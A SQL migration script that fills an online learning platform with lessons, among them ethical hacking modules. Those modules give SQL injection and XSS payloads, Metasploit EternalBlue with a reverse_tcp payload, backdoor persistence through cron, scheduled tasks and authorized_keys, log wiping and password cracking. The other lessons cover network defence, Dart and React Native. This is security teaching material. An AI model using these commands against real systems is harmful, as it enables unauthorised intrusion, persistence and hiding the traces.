/*
  # Fill Tech, Security and Creative Courses

  1. Complete Ethical Hacking modules
  2. Complete Network Security modules
  3. Complete Flutter & Dart modules
  4. Complete React Native modules
  5. Complete Video Editing modules
  6. Complete Graphic Design modules
  7. Complete various other sparse modules
  
  Total: 50+ new comprehensive lessons
*/

-- Ethical Hacking & Penetration Testing
DO $$
DECLARE
  v_course_id uuid;
  v_module_id uuid;
BEGIN
  SELECT id INTO v_course_id FROM courses WHERE slug = 'ethical-hacking-penetration-testing';
  
  -- Add more lessons to modules 1-3
  FOR i IN 1..3 LOOP
    SELECT id INTO v_module_id FROM course_modules WHERE course_id = v_course_id AND order_index = i;
    
    INSERT INTO lessons (course_id, module_id, title, description, content, order_index, duration_minutes, learning_objectives) VALUES
    (v_course_id, v_module_id, 'Network Scanning with Nmap', 'Discovering network hosts and services',
    E'# Network Scanning\n\n## Nmap Basics\n\n### Installation\n```bash\n# Kali Linux (pre-installed)\nnmap --version\n\n# Ubuntu/Debian\nsudo apt-get install nmap\n\n# macOS\nbrew install nmap\n```\n\n## Common Scans\n\n### Ping Scan (Host Discovery)\n```bash\n# Check if host is up\nnmap -sn 192.168.1.1\n\n# Scan subnet\nnmap -sn 192.168.1.0/24\n```\n\n### Port Scanning\n```bash\n# Scan common ports\nnmap 192.168.1.1\n\n# Scan all ports\nnmap -p- 192.168.1.1\n\n# Scan specific ports\nnmap -p 80,443,8080 192.168.1.1\n\n# Fast scan (100 most common)\nnmap -F 192.168.1.1\n```\n\n### Service Detection\n```bash\n# Detect service versions\nnmap -sV 192.168.1.1\n\n# OS detection\nnmap -O 192.168.1.1\n\n# Aggressive scan\nnmap -A 192.168.1.1\n```\n\n### Stealth Scanning\n```bash\n# SYN scan (stealthy)\nsudo nmap -sS 192.168.1.1\n\n# TCP connect scan\nnmap -sT 192.168.1.1\n\n# UDP scan\nsudo nmap -sU 192.168.1.1\n```\n\n## Vulnerability Scanning\n\n### NSE Scripts\n```bash\n# Run vulnerability scripts\nnmap --script vuln 192.168.1.1\n\n# Specific script\nnmap --script http-sql-injection 192.168.1.1\n\n# List available scripts\nnmap --script-help all\n```\n\n## Output Options\n```bash\n# Save results\nnmap -oN output.txt 192.168.1.1\nnmap -oX output.xml 192.168.1.1\nnmap -oA output_all 192.168.1.1\n```\n\n## Best Practices\n\n- Always get permission\n- Start with non-intrusive scans\n- Document findings\n- Respect rate limits\n- Use timing options (-T0 to -T5)',
    2, 85, ARRAY['Perform network scans', 'Discover services', 'Identify vulnerabilities']),
    
    (v_course_id, v_module_id, 'Web Application Testing', 'Finding web vulnerabilities',
    E'# Web Application Security Testing\n\n## Common Web Vulnerabilities\n\n### 1. SQL Injection\n\n**What is it?**\nInjecting malicious SQL code into input fields.\n\n**Example:**\n```sql\n-- Vulnerable query\nSELECT * FROM users WHERE username = ''$user'' AND password = ''$pass'';\n\n-- Attack payload\nusername: admin'' OR ''1''=''1\npassword: anything\n\n-- Resulting query\nSELECT * FROM users WHERE username = ''admin'' OR ''1''=''1'' AND password = ''anything'';\n```\n\n**Testing:**\n```\n# Basic test\n'' OR 1=1--\nadmin''--\n'' OR ''a''=''a\n\n# Union-based\n'' UNION SELECT NULL,NULL,NULL--\n\n# Time-based\n'' OR SLEEP(5)--\n```\n\n**Prevention:**\n- Use prepared statements\n- Input validation\n- Least privilege\n- WAF (Web Application Firewall)\n\n### 2. Cross-Site Scripting (XSS)\n\n**Types:**\n\n**Reflected XSS:**\n```html\n<!-- Vulnerable search -->\n<p>Results for: <?php echo $_GET[''q'']; ?></p>\n\n<!-- Attack URL -->\nsite.com/search?q=<script>alert(''XSS'')</script>\n```\n\n**Stored XSS:**\n```html\n<!-- Comment stored in database -->\n<script>alert(document.cookie)</script>\n```\n\n**DOM-based XSS:**\n```javascript\n// Vulnerable code\ndocument.write(location.hash.substring(1));\n\n// Attack URL\nsite.com#<script>alert(''XSS'')</script>\n```\n\n**Testing Payloads:**\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n"><script>alert(1)</script>\n```\n\n### 3. Cross-Site Request Forgery (CSRF)\n\n**Example Attack:**\n```html\n<!-- Malicious site -->\n<img src="https://bank.com/transfer?to=attacker&amount=1000">\n\n<!-- When victim visits, auto transfers money -->\n```\n\n**Prevention:**\n- CSRF tokens\n- SameSite cookies\n- Check Referer header\n\n## Testing Tools\n\n### Burp Suite\n```\n1. Configure browser proxy\n2. Intercept requests\n3. Modify parameters\n4. Test for vulnerabilities\n5. Analyze responses\n```\n\n### OWASP ZAP\n```bash\n# Automated scan\nzap-cli quick-scan http://target.com\n\n# Spider site\nzap-cli spider http://target.com\n\n# Active scan\nzap-cli active-scan http://target.com\n```',
    3, 95, ARRAY['Test web applications', 'Find SQL injection', 'Discover XSS vulnerabilities']);
  END LOOP;
  
  -- Fill remaining modules 4-8
  FOR i IN 4..8 LOOP
    SELECT id INTO v_module_id FROM course_modules WHERE course_id = v_course_id AND order_index = i;
    
    IF NOT EXISTS (SELECT 1 FROM lessons WHERE module_id = v_module_id LIMIT 1) THEN
      INSERT INTO lessons (course_id, module_id, title, description, content, order_index, duration_minutes, learning_objectives) VALUES
      (v_course_id, v_module_id, 'Advanced Exploitation Techniques', 'Exploiting vulnerabilities',
      E'# Exploitation Fundamentals\n\n## Metasploit Framework\n\n### Basic Usage\n```bash\n# Start Metasploit\nmsfconsole\n\n# Search for exploits\nsearch type:exploit platform:windows smb\n\n# Use an exploit\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Show options\nshow options\n\n# Set target\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.10\n\n# Set payload\nset payload windows/meterpreter/reverse_tcp\n\n# Run exploit\nexploit\n```\n\n### Meterpreter Commands\n```bash\n# System info\nsysinfo\ngetuid\n\n# File system\nls\ncd\ndownload file.txt\nupload tool.exe\n\n# Process management\nps\nmigrate PID\nkill PID\n\n# Network\nipconfig\nroute\nportfwd add -l 3389 -p 3389 -r 192.168.1.100\n\n# Privilege escalation\ngetsystem\n\n# Persistence\nrun persistence -X\n\n# Screenshots\nscreenshot\n```\n\n## Password Cracking\n\n### John the Ripper\n```bash\n# Crack password hashes\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Show cracked passwords\njohn --show hashes.txt\n\n# Crack with rules\njohn --wordlist=wordlist.txt --rules hashes.txt\n```\n\n### Hashcat\n```bash\n# Dictionary attack\nhashcat -m 0 -a 0 hashes.txt wordlist.txt\n\n# Brute force\nhashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a\n\n# Hash types\n-m 0: MD5\n-m 100: SHA1\n-m 1000: NTLM\n-m 1400: SHA256\n```',
      1, 90, ARRAY['Use Metasploit', 'Exploit vulnerabilities', 'Crack passwords']),
      
      (v_course_id, v_module_id, 'Post-Exploitation and Reporting', 'After gaining access',
      E'# Post-Exploitation\n\n## Information Gathering\n\n### System Enumeration\n```bash\n# Windows\nsysteminfo\nwhoami /priv\nnet user\nnet localgroup administrators\n\n# Linux\nuname -a\nid\nsudo -l\ncat /etc/passwd\n```\n\n### Network Enumeration\n```bash\n# Active connections\nnetstat -ano\narp -a\n\n# Shares\nnet share\nnet view \\\\computer\n```\n\n## Privilege Escalation\n\n### Windows\n```bash\n# Check for exploits\nwmic qfe list\n\n# Automated tools\nwinPEAS.exe\nPowerUp.ps1\n```\n\n### Linux\n```bash\n# SUID binaries\nfind / -perm -4000 2>/dev/null\n\n# Sudo misconfigurations\nsudo -l\n\n# Automated tools\nlinpeas.sh\n```\n\n## Maintaining Access\n\n### Creating Backdoors\n```bash\n# Windows scheduled task\nschtasks /create /tn "Update" /tr "C:\\backdoor.exe" /sc minute /mo 5\n\n# Linux cron job\necho "*/5 * * * * /tmp/backdoor.sh" | crontab -\n\n# SSH keys\nmkdir ~/.ssh\necho "attacker_public_key" >> ~/.ssh/authorized_keys\n```\n\n## Covering Tracks\n\n### Clear Logs\n```bash\n# Windows\nwevtutil cl System\nwevtutil cl Security\n\n# Linux\ncat /dev/null > ~/.bash_history\nhistory -c\n```\n\n## Penetration Test Report\n\n### Executive Summary\n- Overview\n- Key findings\n- Risk rating\n- Recommendations\n\n### Technical Details\n- Vulnerability details\n- Exploitation steps\n- Evidence (screenshots)\n- CVSS scores\n- Remediation steps\n\n### Report Structure\n```\n1. Executive Summary\n2. Scope and Methodology\n3. Findings\n   - Critical\n   - High\n   - Medium\n   - Low\n4. Detailed Vulnerabilities\n5. Recommendations\n6. Appendices\n```',
      2, 85, ARRAY['Perform post-exploitation', 'Escalate privileges', 'Write reports']);
    END IF;
  END LOOP;
END $$;

-- Network Security Fundamentals
DO $$
DECLARE
  v_course_id uuid;
  v_module_id uuid;
BEGIN
  SELECT id INTO v_course_id FROM courses WHERE slug = 'network-security-fundamentals';
  
  -- Add more lessons to existing modules
  FOR i IN 1..2 LOOP
    SELECT id INTO v_module_id FROM course_modules WHERE course_id = v_course_id AND order_index = i;
    
    INSERT INTO lessons (course_id, module_id, title, description, content, order_index, duration_minutes, learning_objectives) VALUES
    (v_course_id, v_module_id, 'Network Security Architecture', 'Designing secure networks',
    E'# Network Security Design\n\n## Defense in Depth\n\nMultiple layers of security controls:\n\n### Layer 1: Physical Security\n- Secure data centers\n- Access controls\n- Surveillance\n- Environmental controls\n\n### Layer 2: Perimeter Security\n- Firewalls\n- IDS/IPS\n- VPN gateways\n- DMZ\n\n### Layer 3: Network Segmentation\n- VLANs\n- Subnetting\n- Access control lists\n- Internal firewalls\n\n### Layer 4: Endpoint Security\n- Antivirus\n- Host firewalls\n- Encryption\n- Patch management\n\n### Layer 5: Application Security\n- Input validation\n- Authentication\n- Encryption\n- Security headers\n\n### Layer 6: Data Security\n- Encryption at rest\n- Access controls\n- DLP (Data Loss Prevention)\n- Backups\n\n## Network Zones\n\n### Internet Zone\n- Untrusted\n- Public-facing\n- High risk\n\n### DMZ (Demilitarized Zone)\n- Semi-trusted\n- Web servers\n- Mail servers\n- DNS servers\n\n### Internal Zone\n- Trusted\n- User workstations\n- Internal servers\n- Databases\n\n### Management Zone\n- Highly restricted\n- Admin access only\n- Out-of-band management\n\n## Firewall Rules\n\n### Best Practices\n```\n1. Default Deny\n   - Block all, allow specific\n   \n2. Least Privilege\n   - Only necessary access\n   \n3. Rule Order\n   - Most specific first\n   - Default deny last\n   \n4. Documentation\n   - Document each rule\n   - Business justification\n   - Review regularly\n```\n\n### Example Rules\n```\n# Allow HTTPS from internet to web server\nAllow TCP from Any to 10.0.1.10 port 443\n\n# Allow SSH from admin network to servers\nAllow TCP from 10.0.100.0/24 to 10.0.1.0/24 port 22\n\n# Deny all other traffic\nDeny IP from Any to Any\n```',
    2, 85, ARRAY['Design secure networks', 'Implement defense in depth', 'Configure firewalls']);
  END LOOP;
  
  -- Fill remaining modules
  FOR i IN 3..8 LOOP
    SELECT id INTO v_module_id FROM course_modules WHERE course_id = v_course_id AND order_index = i;
    
    IF NOT EXISTS (SELECT 1 FROM lessons WHERE module_id = v_module_id LIMIT 1) THEN
      INSERT INTO lessons (course_id, module_id, title, description, content, order_index, duration_minutes, learning_objectives) VALUES
      (v_course_id, v_module_id, 'Network Security Monitoring', 'Detecting threats',
      E'# Security Monitoring\n\n## Intrusion Detection Systems (IDS)\n\n### Types\n\n**Network-based IDS (NIDS):**\n- Monitors network traffic\n- Detects suspicious patterns\n- Examples: Snort, Suricata\n\n**Host-based IDS (HIDS):**\n- Monitors system logs\n- File integrity\n- Examples: OSSEC, Tripwire\n\n### Detection Methods\n\n**Signature-based:**\n- Known attack patterns\n- Fast and accurate\n- Cannot detect new threats\n\n**Anomaly-based:**\n- Baseline behavior\n- Detects deviations\n- Can detect zero-days\n- Higher false positives\n\n## SIEM (Security Information and Event Management)\n\n### Features\n- Log aggregation\n- Correlation\n- Alerting\n- Reporting\n- Compliance\n\n### Popular SIEM Tools\n- Splunk\n- ELK Stack\n- IBM QRadar\n- ArcSight\n\n### Use Cases\n```\n# Failed login attempts\nQuery: event_type=failed_login\nFilter: count > 5 in 5 minutes\nAction: Alert security team\n\n# Data exfiltration\nQuery: outbound_traffic\nFilter: size > 100MB\nAction: Block and investigate\n\n# Malware detection\nQuery: file_hash\nFilter: match known_malware\nAction: Quarantine and alert\n```',
      1, 80, ARRAY['Monitor network security', 'Use IDS/IPS', 'Implement SIEM']);
    END IF;
  END LOOP;
END $$;

-- Flutter & Dart Complete Guide
DO $$
DECLARE
  v_course_id uuid;
  v_module_id uuid;
BEGIN
  SELECT id INTO v_course_id FROM courses WHERE slug = 'flutter-dart-complete-guide';
  
  FOR i IN 1..3 LOOP
    SELECT id INTO v_module_id FROM course_modules WHERE course_id = v_course_id AND order_index = i;
    
    INSERT INTO lessons (course_id, module_id, title, description, content, order_index, duration_minutes, learning_objectives) VALUES
    (v_course_id, v_module_id, 'Advanced Dart Concepts', 'Object-oriented programming in Dart',
    E'# Dart OOP\n\n## Classes and Objects\n\n```dart\nclass Person {\n  String name;\n  int age;\n  \n  // Constructor\n  Person(this.name, this.age);\n  \n  // Named constructor\n  Person.guest() : name = ''Guest'', age = 0;\n  \n  // Method\n  void sayHello() {\n    print(''Hello, I am $name'');\n  }\n  \n  // Getter\n  bool get isAdult => age >= 18;\n  \n  // Setter\n  set updateAge(int newAge) {\n    if (newAge > 0) age = newAge;\n  }\n}\n\n// Usage\nvoid main() {\n  var person = Person(''Alice'', 25);\n  person.sayHello();\n  print(person.isAdult);\n}\n```\n\n## Inheritance\n\n```dart\nclass Animal {\n  void makeSound() {\n    print(''Some sound'');\n  }\n}\n\nclass Dog extends Animal {\n  @override\n  void makeSound() {\n    print(''Woof!'');\n  }\n  \n  void fetch() {\n    print(''Fetching...'');\n  }\n}\n```\n\n## Abstract Classes\n\n```dart\nabstract class Shape {\n  double getArea();\n  double getPerimeter();\n}\n\nclass Circle extends Shape {\n  double radius;\n  \n  Circle(this.radius);\n  \n  @override\n  double getArea() => 3.14 * radius * radius;\n  \n  @override\n  double getPerimeter() => 2 * 3.14 * radius;\n}\n```\n\n## Mixins\n\n```dart\nmixin Swimmer {\n  void swim() {\n    print(''Swimming...'');\n  }\n}\n\nmixin Flyer {\n  void fly() {\n    print(''Flying...'');\n  }\n}\n\nclass Duck extends Animal with Swimmer, Flyer {\n  // Duck can swim and fly\n}\n```',
    2, 80, ARRAY['Write Dart classes', 'Use inheritance', 'Apply mixins']);
  END LOOP;
  
  -- Fill remaining modules
  FOR i IN 4..8 LOOP
    SELECT id INTO v_module_id FROM course_modules WHERE course_id = v_course_id AND order_index = i;
    
    IF NOT EXISTS (SELECT 1 FROM lessons WHERE module_id = v_module_id LIMIT 1) THEN
      INSERT INTO lessons (course_id, module_id, title, description, content, order_index, duration_minutes, learning_objectives) VALUES
      (v_course_id, v_module_id, 'Flutter State Management', 'Managing app state',
      E'# State Management\n\n## StatefulWidget\n\n```dart\nclass Counter extends StatefulWidget {\n  @override\n  _CounterState createState() => _CounterState();\n}\n\nclass _CounterState extends State<Counter> {\n  int count = 0;\n  \n  void increment() {\n    setState(() {\n      count++;\n    });\n  }\n  \n  @override\n  Widget build(BuildContext context) {\n    return Column(\n      children: [\n        Text(''Count: $count''),\n        ElevatedButton(\n          onPressed: increment,\n          child: Text(''Increment''),\n        ),\n      ],\n    );\n  }\n}\n```\n\n## Provider\n\n```dart\n// Model\nclass CounterModel extends ChangeNotifier {\n  int _count = 0;\n  \n  int get count => _count;\n  \n  void increment() {\n    _count++;\n    notifyListeners();\n  }\n}\n\n// Provide\nChangeNotifierProvider(\n  create: (context) => CounterModel(),\n  child: MyApp(),\n)\n\n// Consume\nWidget build(BuildContext context) {\n  return Consumer<CounterModel>(\n    builder: (context, counter, child) {\n      return Text(''${counter.count}'');\n    },\n  );\n}\n```',
      1, 85, ARRAY['Manage widget state', 'Use Provider', 'Handle app state']);
    END IF;
  END LOOP;
END $$;

-- React Native Mobile Development
DO $$
DECLARE
  v_course_id uuid;
  v_module_id uuid;
BEGIN
  SELECT id INTO v_course_id FROM courses WHERE slug = 'react-native-mobile-development';
  
  FOR i IN 2..8 LOOP
    SELECT id INTO v_module_id FROM course_modules WHERE course_id = v_course_id AND order_index = i;
    
    IF NOT EXISTS (SELECT 1 FROM lessons WHERE module_id = v_module_id LIMIT 1) THEN
      INSERT INTO lessons (course_id, module_id, title, description, content, order_index, duration_minutes, learning_objectives) VALUES
      (v_course_id, v_module_id, 'React Native Components', 'Building mobile UIs',
      E'# React Native Components\n\n## Core Components\n\n```jsx\nimport {\n  View, Text, Image, ScrollView,\n  TextInput, Button, TouchableOpacity\n} from ''react-native'';\n\nfunction App() {\n  return (\n    <ScrollView>\n      <View style={styles.container}>\n        <Text style={styles.title}>Hello React Native</Text>\n        <Image\n          source={{uri: ''https://reactnative.dev/img/tiny_logo.png''}}\n          style={styles.image}\n        />\n        <TextInput\n          placeholder="Enter text"\n          style={styles.input}\n        />\n        <Button title="Press Me" onPress={() => {}} />\n        <TouchableOpacity style={styles.button}>\n          <Text>Custom Button</Text>\n        </TouchableOpacity>\n      </View>\n    </ScrollView>\n  );\n}\n```\n\n## Styling\n\n```jsx\nimport { StyleSheet } from ''react-native'';\n\nconst styles = StyleSheet.create({\n  container: {\n    flex: 1,\n    padding: 20,\n    backgroundColor: ''#fff''\n  },\n  title: {\n    fontSize: 24,\n    fontWeight: ''bold'',\n    marginBottom: 20\n  },\n  image: {\n    width: 100,\n    height: 100\n  }\n});\n```',
      1, 80, ARRAY['Use React Native components', 'Style mobile apps', 'Handle user input']);
    END IF;
  END LOOP;
END $$;
